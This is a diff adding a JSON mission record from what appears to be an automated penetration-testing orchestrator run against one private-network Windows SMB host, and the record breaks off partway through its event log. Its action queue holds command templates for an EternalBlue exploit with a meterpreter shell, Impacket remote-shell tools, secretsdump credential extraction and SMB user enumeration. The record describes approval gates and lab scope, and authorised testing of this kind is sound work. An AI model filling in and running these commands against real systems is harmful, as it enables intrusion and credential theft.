@@ -1,0 +1,1436 @@
+{
+  "mission_id": "msn_90e8f071ec8d765e",
+  "playbook_id": "edge_to_internal_proof",
+  "playbook_title": "Edge to internal impact proof",
+  "goal": "From authorised edge evidence, auto-validate safe exposures, branch when celebrity exploits are patched, unlock high-risk impact only with proof plan + operator approval, then expand via pivot.",
+  "summary": "Closed-loop mission: surface \u2192 safe validation \u2192 branch brain \u2192 impact gate \u2192 pivot expand \u2192 debrief.",
+  "risk_posture": "validate",
+  "status": "completed",
+  "created_at": "2026-07-22T05:15:58.311921+00:00",
+  "updated_at": "2026-07-22T05:15:58.374400+00:00",
+  "scan_id": "09945b6414cd",
+  "scope": {},
+  "notes": "",
+  "stage_index": 8,
+  "current_stage_id": "mission_debrief",
+  "stages": [
+    {
+      "id": "mission_brief",
+      "title": "Mission brief",
+      "order": 0,
+      "description": "Scope and goal locked. Evidence-closed-loop orchestrator armed.",
+      "status": "completed",
+      "auto_advance": true,
+      "requires_unlock_flag": "",
+      "completed_at": "2026-07-22T05:15:58.317678+00:00"
+    },
+    {
+      "id": "surface_lock",
+      "title": "Surface lock",
+      "order": 1,
+      "description": "Ingest Ethernet/LAN-authorised scan evidence into the attack graph.",
+      "status": "completed",
+      "auto_advance": true,
+      "requires_unlock_flag": "",
+      "started_at": "2026-07-22T05:15:58.317837+00:00",
+      "completed_actions": [
+        "ingest_scan",
+        "build_graph"
+      ],
+      "completed_at": "2026-07-22T05:15:58.324379+00:00"
+    },
+    {
+      "id": "hypothesis",
+      "title": "Hypothesis",
+      "order": 2,
+      "description": "Catalog matches known modules; unknown surfaces enter research queue. AI may rank but never invents module paths.",
+      "status": "completed",
+      "auto_advance": true,
+      "requires_unlock_flag": "",
+      "started_at": "2026-07-22T05:15:58.324527+00:00",
+      "completed_actions": [
+        "catalog_hypotheses"
+      ],
+      "completed_at": "2026-07-22T05:15:58.349457+00:00"
+    },
+    {
+      "id": "safe_validation",
+      "title": "Safe validation storm",
+      "order": 3,
+      "description": "Automatically queue low/medium risk catalog scanners and safe MS17/BlueKeep checks. No shells.",
+      "status": "completed",
+      "auto_advance": true,
+      "requires_unlock_flag": "",
+      "started_at": "2026-07-22T05:15:58.349605+00:00",
+      "completed_actions": [
+        "queue_safe_aux"
+      ],
+      "completed_at": "2026-07-22T05:15:58.358722+00:00"
+    },
+    {
+      "id": "branch_brain",
+      "title": "Branch brain",
+      "order": 4,
+      "description": "Evaluate evidence flags. Patched celebrity vulns suppress exploits and unlock alternate paths.",
+      "status": "completed",
+      "auto_advance": true,
+      "requires_unlock_flag": "",
+      "started_at": "2026-07-22T05:15:58.358854+00:00",
+      "completed_actions": [
+        "evaluate_branches"
+      ],
+      "completed_at": "2026-07-22T05:15:58.366315+00:00"
+    },
+    {
+      "id": "impact_gate",
+      "title": "Impact gate",
+      "order": 5,
+      "description": "High-risk catalog exploits and web footholds wait for human approval + proof plan.",
+      "status": "skipped",
+      "auto_advance": false,
+      "requires_unlock_flag": "impact_path_available",
+      "completed_at": "2026-07-22T05:15:58.366449+00:00"
+    },
+    {
+      "id": "alternate_lateral",
+      "title": "Alternate lateral (non-EB)",
+      "order": 6,
+      "description": "When EternalBlue-class paths are suppressed, plan catalog lateral techniques (enum, signing, creds-oriented).",
+      "status": "completed",
+      "auto_advance": true,
+      "requires_unlock_flag": "alternate_lateral_enabled",
+      "started_at": "2026-07-22T05:15:58.366514+00:00",
+      "completed_actions": [
+        "queue_lateral_alts"
+      ],
+      "completed_at": "2026-07-22T05:15:58.371151+00:00"
+    },
+    {
+      "id": "pivot_expand",
+      "title": "Pivot expand",
+      "order": 7,
+      "description": "After foothold proof, expand into internal Ethernet segments (USERS/ADMIN VLANs). Direct path must be blocked for true pivot narrative.",
+      "status": "skipped",
+      "auto_advance": false,
+      "requires_unlock_flag": "foothold_proved",
+      "completed_at": "2026-07-22T05:15:58.371294+00:00"
+    },
+    {
+      "id": "mission_debrief",
+      "title": "Mission debrief",
+      "order": 8,
+      "description": "Compile proved findings, suppressed exploits, research queue, MITRE chain, and blue-team timeline.",
+      "status": "completed",
+      "auto_advance": true,
+      "requires_unlock_flag": "",
+      "started_at": "2026-07-22T05:15:58.371357+00:00",
+      "completed_actions": [
+        "compile_debrief"
+      ],
+      "completed_at": "2026-07-22T05:15:58.374121+00:00"
+    }
+  ],
+  "flags": [
+    "smb_present",
+    "alternate_lateral_enabled",
+    "branch_ms17_suppressed",
+    "ms17_not_exploitable",
+    "unknown_surface_present",
+    "research_queue_active"
+  ],
+  "evidence_flags": {
+    "http_present": false,
+    "https_present": false,
+    "smb_present": true,
+    "ssh_present": false,
+    "rdp_present": false,
+    "ms17_cve_evidence": false,
+    "bluekeep_cve_evidence": false,
+    "alternate_lateral_enabled": true,
+    "branch_ms17_suppressed": true,
+    "ms17_not_exploitable": true,
+    "unknown_surface_present": true,
+    "research_queue_active": true
+  },
+  "action_queue": [
+    {
+      "queue_id": "act_e49e6d950104cb78",
+      "kind": "metasploit",
+      "title": "Metasploit RPC endpoint mapper",
+      "catalog_key": "msf_rpc_dump",
+      "action_id": "msf_rpc_dump:192.168.86.129:135",
+      "target": "192.168.86.129",
+      "port": 135,
+      "service": "msrpc",
+      "risk": "medium",
+      "module_type": "auxiliary",
+      "module_name": "scanner/dcerpc/endpoint_mapper",
+      "auto": true,
+      "requires_approval": false,
+      "status": "queued_auto",
+      "reason": "Maps RPC endpoints for lateral planning on Windows hosts.",
+      "matched_cves": [],
+      "stage_id": "safe_validation",
+      "executor": "metasploit"
+    },
+    {
+      "queue_id": "lat_cc68523afb46cfe0",
+      "kind": "lateral",
+      "title": "EternalBlue (MS17-010) via proxychains",
+      "catalog_key": "ms17_010",
+      "action_id": "ms17_010:192.168.86.129:135",
+      "target": "192.168.86.129",
+      "port": 135,
+      "service": "msrpc",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Windows SMB host with possible MS17-010 \u2014 validate with smb_ms17_010 then exploit via proxychains if approved",
+      "command_template": "proxychains -q msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set PAYLOAD windows/x64/meterpreter/bind_tcp; set LPORT 4444; exploit -z; sessions -l'",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_b0fbe4f9130a5ac8",
+      "kind": "lateral",
+      "title": "Impacket PsExec",
+      "catalog_key": "psexec",
+      "action_id": "psexec:192.168.86.129:135",
+      "target": "192.168.86.129",
+      "port": 135,
+      "service": "msrpc",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "SMB accessible \u2014 try credentialed PsExec if lab creds are available",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/psexec.py {username}:{password}@{target_ip} cmd.exe",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_6ba1a7a940ff2e07",
+      "kind": "lateral",
+      "title": "Impacket smbexec",
+      "catalog_key": "smbexec",
+      "action_id": "smbexec:192.168.86.129:135",
+      "target": "192.168.86.129",
+      "port": 135,
+      "service": "msrpc",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "SMB accessible \u2014 smbexec is an alternate semi-interactive shell path",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/smbexec.py {username}:{password}@{target_ip} cmd.exe",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_c246991a11027a2e",
+      "kind": "lateral",
+      "title": "Impacket wmiexec",
+      "catalog_key": "wmiexec",
+      "action_id": "wmiexec:192.168.86.129:135",
+      "target": "192.168.86.129",
+      "port": 135,
+      "service": "msrpc",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "WMI/RPC path available \u2014 try wmiexec with lab credentials",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/wmiexec.py {username}:{password}@{target_ip} cmd.exe",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_2a961792238dda10",
+      "kind": "lateral",
+      "title": "CrackMapExec SMB enumeration",
+      "catalog_key": "cme_smb_enum",
+      "action_id": "cme_smb_enum:192.168.86.129:135",
+      "target": "192.168.86.129",
+      "port": 135,
+      "service": "msrpc",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Patched SMB host \u2014 enumerate shares and signing via CME (works without exploit)",
+      "command_template": "proxychains -q crackmapexec smb {target_ip} --shares",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_59619a071d5b6528",
+      "kind": "lateral",
+      "title": "CrackMapExec SMB user enumeration",
+      "catalog_key": "cme_smb_users",
+      "action_id": "cme_smb_users:192.168.86.129:135",
+      "target": "192.168.86.129",
+      "port": 135,
+      "service": "msrpc",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Enumerate domain users via SMB null session or guest on patched Win10",
+      "command_template": "proxychains -q crackmapexec smb {target_ip} --users",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_9445864616566277",
+      "kind": "lateral",
+      "title": "Impacket secretsdump (credential extraction)",
+      "catalog_key": "impacket_secretsdump",
+      "action_id": "impacket_secretsdump:192.168.86.129:135",
+      "target": "192.168.86.129",
+      "port": 135,
+      "service": "msrpc",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "SMB with creds \u2014 dump SAM/SECRETS for lateral privilege analysis",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/secretsdump.py {username}:{password}@{target_ip}",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_1544b83ee1093600",
+      "kind": "lateral",
+      "title": "Nmap SMB vulnerability scripts",
+      "catalog_key": "nmap_smb_scripts",
+      "action_id": "nmap_smb_scripts:192.168.86.129:135",
+      "target": "192.168.86.129",
+      "port": 135,
+      "service": "msrpc",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Run nmap SMB vulnerability scripts for CVE evidence collection \u2014 works on any SMB host",
+      "command_template": "nmap -p 445 --script smb-vuln* {target_ip} -oN nmap_smb_vuln_{target_ip}.txt",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "act_065c93429a448129",
+      "kind": "metasploit",
+      "title": "Metasploit SMB version scanner",
+      "catalog_key": "msf_smb_version",
+      "action_id": "msf_smb_version:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "auxiliary",
+      "module_name": "scanner/smb/smb_version",
+      "auto": true,
+      "requires_approval": false,
+      "status": "queued_auto",
+      "reason": "Fingerprints exposed SMB services for validation evidence.",
+      "matched_cves": [],
+      "stage_id": "safe_validation",
+      "executor": "metasploit"
+    },
+    {
+      "queue_id": "act_1155c040bc515e35",
+      "kind": "metasploit",
+      "title": "Metasploit SMB signing scanner",
+      "catalog_key": "msf_smb_unsigned",
+      "action_id": "msf_smb_unsigned:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "auxiliary",
+      "module_name": "scanner/smb/smb2",
+      "auto": true,
+      "requires_approval": false,
+      "status": "queued_auto",
+      "reason": "SMB protocol evidence collection for later lateral planning.",
+      "matched_cves": [],
+      "stage_id": "safe_validation",
+      "executor": "metasploit"
+    },
+    {
+      "queue_id": "act_4324b222a51531e1",
+      "kind": "metasploit",
+      "title": "Metasploit SMB share enumerator",
+      "catalog_key": "msf_smb_enumshares",
+      "action_id": "msf_smb_enumshares:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "auxiliary",
+      "module_name": "scanner/smb/smb_enumshares",
+      "auto": true,
+      "requires_approval": false,
+      "status": "queued_auto",
+      "reason": "Enumerates SMB shares on patched systems \u2014 works without exploit, provides lateral intel.",
+      "matched_cves": [],
+      "stage_id": "safe_validation",
+      "executor": "metasploit"
+    },
+    {
+      "queue_id": "act_d21b79c4c40bd42c",
+      "kind": "metasploit",
+      "title": "Metasploit SMB user enumerator",
+      "catalog_key": "msf_smb_enumusers",
+      "action_id": "msf_smb_enumusers:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "auxiliary",
+      "module_name": "scanner/smb/smb_enumusers",
+      "auto": true,
+      "requires_approval": false,
+      "status": "queued_auto",
+      "reason": "Enumerates domain users via SMB \u2014 works against patched Win10 for credential target list.",
+      "matched_cves": [],
+      "stage_id": "safe_validation",
+      "executor": "metasploit"
+    },
+    {
+      "queue_id": "lat_77005c89d5cd3857",
+      "kind": "lateral",
+      "title": "EternalBlue (MS17-010) via proxychains",
+      "catalog_key": "ms17_010",
+      "action_id": "ms17_010:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Windows SMB host with possible MS17-010 \u2014 validate with smb_ms17_010 then exploit via proxychains if approved",
+      "command_template": "proxychains -q msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set PAYLOAD windows/x64/meterpreter/bind_tcp; set LPORT 4444; exploit -z; sessions -l'",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_2e61df699202a8a1",
+      "kind": "lateral",
+      "title": "Impacket PsExec",
+      "catalog_key": "psexec",
+      "action_id": "psexec:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "SMB accessible \u2014 try credentialed PsExec if lab creds are available",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/psexec.py {username}:{password}@{target_ip} cmd.exe",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_10e6a4a40b5b5657",
+      "kind": "lateral",
+      "title": "Impacket smbexec",
+      "catalog_key": "smbexec",
+      "action_id": "smbexec:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "SMB accessible \u2014 smbexec is an alternate semi-interactive shell path",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/smbexec.py {username}:{password}@{target_ip} cmd.exe",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_7f3982c4f9be7f5b",
+      "kind": "lateral",
+      "title": "Impacket wmiexec",
+      "catalog_key": "wmiexec",
+      "action_id": "wmiexec:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "WMI/RPC path available \u2014 try wmiexec with lab credentials",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/wmiexec.py {username}:{password}@{target_ip} cmd.exe",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_d35a1bdda0444ab5",
+      "kind": "lateral",
+      "title": "CrackMapExec SMB enumeration",
+      "catalog_key": "cme_smb_enum",
+      "action_id": "cme_smb_enum:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Patched SMB host \u2014 enumerate shares and signing via CME (works without exploit)",
+      "command_template": "proxychains -q crackmapexec smb {target_ip} --shares",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_8ff177ebaa271867",
+      "kind": "lateral",
+      "title": "CrackMapExec SMB user enumeration",
+      "catalog_key": "cme_smb_users",
+      "action_id": "cme_smb_users:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Enumerate domain users via SMB null session or guest on patched Win10",
+      "command_template": "proxychains -q crackmapexec smb {target_ip} --users",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_741b678b887e5af7",
+      "kind": "lateral",
+      "title": "Impacket secretsdump (credential extraction)",
+      "catalog_key": "impacket_secretsdump",
+      "action_id": "impacket_secretsdump:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "SMB with creds \u2014 dump SAM/SECRETS for lateral privilege analysis",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/secretsdump.py {username}:{password}@{target_ip}",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_59c837e4c41195b3",
+      "kind": "lateral",
+      "title": "Nmap SMB vulnerability scripts",
+      "catalog_key": "nmap_smb_scripts",
+      "action_id": "nmap_smb_scripts:192.168.86.129:139",
+      "target": "192.168.86.129",
+      "port": 139,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Run nmap SMB vulnerability scripts for CVE evidence collection \u2014 works on any SMB host",
+      "command_template": "nmap -p 445 --script smb-vuln* {target_ip} -oN nmap_smb_vuln_{target_ip}.txt",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "act_95e889f55bc1f324",
+      "kind": "metasploit",
+      "title": "Metasploit SMB version scanner",
+      "catalog_key": "msf_smb_version",
+      "action_id": "msf_smb_version:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "auxiliary",
+      "module_name": "scanner/smb/smb_version",
+      "auto": true,
+      "requires_approval": false,
+      "status": "queued_auto",
+      "reason": "Fingerprints exposed SMB services for validation evidence.",
+      "matched_cves": [],
+      "stage_id": "safe_validation",
+      "executor": "metasploit"
+    },
+    {
+      "queue_id": "act_86a267e66ea4668e",
+      "kind": "metasploit",
+      "title": "MS17-010 EternalBlue check (safe)",
+      "catalog_key": "msf_smb_ms17_010_check",
+      "action_id": "msf_smb_ms17_010_check:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "high",
+      "module_type": "auxiliary",
+      "module_name": "scanner/smb/smb_ms17_010",
+      "auto": true,
+      "requires_approval": false,
+      "status": "queued_auto",
+      "reason": "Non-session check for MS17-010 exposure when SMB or matching CVE evidence is present.",
+      "matched_cves": [],
+      "stage_id": "safe_validation",
+      "executor": "metasploit"
+    },
+    {
+      "queue_id": "act_8d38367d0157c864",
+      "kind": "metasploit",
+      "title": "Metasploit SMB signing scanner",
+      "catalog_key": "msf_smb_unsigned",
+      "action_id": "msf_smb_unsigned:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "auxiliary",
+      "module_name": "scanner/smb/smb2",
+      "auto": true,
+      "requires_approval": false,
+      "status": "queued_auto",
+      "reason": "SMB protocol evidence collection for later lateral planning.",
+      "matched_cves": [],
+      "stage_id": "safe_validation",
+      "executor": "metasploit"
+    },
+    {
+      "queue_id": "act_32ba6d5f4d07f910",
+      "kind": "metasploit",
+      "title": "Metasploit SMB share enumerator",
+      "catalog_key": "msf_smb_enumshares",
+      "action_id": "msf_smb_enumshares:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "auxiliary",
+      "module_name": "scanner/smb/smb_enumshares",
+      "auto": true,
+      "requires_approval": false,
+      "status": "queued_auto",
+      "reason": "Enumerates SMB shares on patched systems \u2014 works without exploit, provides lateral intel.",
+      "matched_cves": [],
+      "stage_id": "safe_validation",
+      "executor": "metasploit"
+    },
+    {
+      "queue_id": "act_61b340b8d5a6edc2",
+      "kind": "metasploit",
+      "title": "Metasploit SMB user enumerator",
+      "catalog_key": "msf_smb_enumusers",
+      "action_id": "msf_smb_enumusers:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "auxiliary",
+      "module_name": "scanner/smb/smb_enumusers",
+      "auto": true,
+      "requires_approval": false,
+      "status": "queued_auto",
+      "reason": "Enumerates domain users via SMB \u2014 works against patched Win10 for credential target list.",
+      "matched_cves": [],
+      "stage_id": "safe_validation",
+      "executor": "metasploit"
+    },
+    {
+      "queue_id": "lat_676186067f093e50",
+      "kind": "lateral",
+      "title": "EternalBlue (MS17-010) via proxychains",
+      "catalog_key": "ms17_010",
+      "action_id": "ms17_010:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Windows SMB host with possible MS17-010 \u2014 validate with smb_ms17_010 then exploit via proxychains if approved",
+      "command_template": "proxychains -q msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set PAYLOAD windows/x64/meterpreter/bind_tcp; set LPORT 4444; exploit -z; sessions -l'",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_6853f6a1e364e929",
+      "kind": "lateral",
+      "title": "Impacket PsExec",
+      "catalog_key": "psexec",
+      "action_id": "psexec:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "SMB accessible \u2014 try credentialed PsExec if lab creds are available",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/psexec.py {username}:{password}@{target_ip} cmd.exe",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_c15ced55bf4330e2",
+      "kind": "lateral",
+      "title": "Impacket smbexec",
+      "catalog_key": "smbexec",
+      "action_id": "smbexec:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "SMB accessible \u2014 smbexec is an alternate semi-interactive shell path",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/smbexec.py {username}:{password}@{target_ip} cmd.exe",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_8db3ed71f0904a0d",
+      "kind": "lateral",
+      "title": "Impacket wmiexec",
+      "catalog_key": "wmiexec",
+      "action_id": "wmiexec:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "WMI/RPC path available \u2014 try wmiexec with lab credentials",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/wmiexec.py {username}:{password}@{target_ip} cmd.exe",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_e24320d06a0ffc70",
+      "kind": "lateral",
+      "title": "CrackMapExec SMB enumeration",
+      "catalog_key": "cme_smb_enum",
+      "action_id": "cme_smb_enum:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Patched SMB host \u2014 enumerate shares and signing via CME (works without exploit)",
+      "command_template": "proxychains -q crackmapexec smb {target_ip} --shares",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_85f06d42f72957f9",
+      "kind": "lateral",
+      "title": "CrackMapExec SMB user enumeration",
+      "catalog_key": "cme_smb_users",
+      "action_id": "cme_smb_users:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Enumerate domain users via SMB null session or guest on patched Win10",
+      "command_template": "proxychains -q crackmapexec smb {target_ip} --users",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_83d32498ad0e6a4a",
+      "kind": "lateral",
+      "title": "Impacket secretsdump (credential extraction)",
+      "catalog_key": "impacket_secretsdump",
+      "action_id": "impacket_secretsdump:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "SMB with creds \u2014 dump SAM/SECRETS for lateral privilege analysis",
+      "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/secretsdump.py {username}:{password}@{target_ip}",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "lat_26e669983f835a5a",
+      "kind": "lateral",
+      "title": "Nmap SMB vulnerability scripts",
+      "catalog_key": "nmap_smb_scripts",
+      "action_id": "nmap_smb_scripts:192.168.86.129:445",
+      "target": "192.168.86.129",
+      "port": 445,
+      "service": "smb",
+      "risk": "medium",
+      "module_type": "lateral",
+      "auto": true,
+      "requires_approval": false,
+      "status": "hypothesized",
+      "reason": "Run nmap SMB vulnerability scripts for CVE evidence collection \u2014 works on any SMB host",
+      "command_template": "nmap -p 445 --script smb-vuln* {target_ip} -oN nmap_smb_vuln_{target_ip}.txt",
+      "executor": "pivot",
+      "stage_id": "hypothesis"
+    },
+    {
+      "queue_id": "rq_be41a4a8dd73d4f5",
+      "kind": "research_probe",
+      "title": "Unknown surface 192.168.86.129:137/netbios-ns",
+      "catalog_key": "",
+      "action_id": "research:192.168.86.129:137",
+      "target": "192.168.86.129",
+      "port": 137,
+      "service": "netbios-ns",
+      "risk": "info",
+      "auto": true,
+      "requires_approval": false,
+      "status": "research",
+      "reason": "No catalog module/profile matched this service. Zero-day readiness: classify class, safe-probe only, analyst review.",
+      "module_type": "research",
+      "stage_id": "hypothesis",
+      "class_hints": [
+        "generic_exposure"
+      ]
+    }
+  ],
+  "branch_events": [
+    {
+      "branch_id": "ms17_patched_or_absent",
+      "message": "SMB present but MS17-010 not evidenced \u2014 exploit suppressed. Alternate lateral planning enabled (professional non-exploit outcome).",
+      "at": "2026-07-22T05:15:58.315039+00:00",
+      "set_flags": [
+        "alternate_lateral_enabled",
+        "branch_ms17_suppressed",
+        "ms17_not_exploitable"
+      ]
+    },
+    {
+      "branch_id": "unknown_surface",
+      "message": "Uncatalogued services entered zero-day readiness / research queue \u2014 safe probes only, no invented exploits.",
+      "at": "2026-07-22T05:15:58.330572+00:00",
+      "set_flags": [
+        "research_queue_active"
+      ]
+    }
+  ],
+  "event_log": [
+    {
+      "at": "2026-07-22T05:15:58.312162+00:00",
+      "kind": "mission_started",
+      "message": "Mission started: Edge to internal impact proof"
+    },
+    {
+      "at": "2026-07-22T05:15:58.315116+00:00",
+      "kind": "branch_fired",
+      "message": "SMB present but MS17-010 not evidenced \u2014 exploit suppressed. Alternate lateral planning enabled (professional non-exploit outcome)."
+    },
+    {
+      "at": "2026-07-22T05:15:58.317865+00:00",
+      "kind": "stage_active",
+      "message": "Entered stage Surface lock"
+    },
+    {
+      "at": "2026-07-22T05:15:58.319058+00:00",
+      "kind": "scan_ingested",
+      "message": "1 host(s), 4 port row(s)"
+    },
+    {
+      "at": "2026-07-22T05:15:58.321253+00:00",
+      "kind": "graph_built",
+      "message": "Graph hosts=1"
+    },
+    {
+      "at": "2026-07-22T05:15:58.324555+00:00",
+      "kind": "stage_active",
+      "message": "Entered stage Hypothesis"
+    },
+    {
+      "at": "2026-07-22T05:15:58.329678+00:00",
+      "kind": "hypotheses_ready",
+      "message": "35 catalog/research hypothese(s)"
+    },
+    {
+      "at": "2026-07-22T05:15:58.330622+00:00",
+      "kind": "branch_fired",
+      "message": "Uncatalogued services entered zero-day readiness / research queue \u2014 safe probes only, no invented exploits."
+    },
+    {
+      "at": "2026-07-22T05:15:58.349636+00:00",
+      "kind": "stage_active",
+      "message": "Entered stage Safe validation storm"
+    },
+    {
+      "at": "2026-07-22T05:15:58.356335+00:00",
+      "kind": "actions_queued",
+      "message": "queued_auto=10 awaiting_approval=0"
+    },
+    {
+      "at": "2026-07-22T05:15:58.363012+00:00",
+      "kind": "stage_active",
+      "message": "Entered stage Branch brain"
+    },
+    {
